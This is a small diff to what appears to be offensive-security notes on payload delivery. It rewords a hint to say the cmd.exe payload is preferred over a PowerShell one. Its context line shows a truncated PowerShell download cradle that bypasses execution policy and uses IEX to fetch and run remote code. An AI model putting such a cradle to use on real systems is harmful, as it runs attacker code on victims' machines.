@@ -7,7 +7,7 @@ powershell  -nop -exec bypass -c "IEX (New-Object System.Net.Webclient).Download
 ```
 
 {% hint style="info" %}
-cmd.exe payload is more reliable and preferred.
+cmd.exe payload is more reliable and preferred than the Powershell payload below.
 {% endhint %}
 
 ## Powershell \(.ps1 file\)
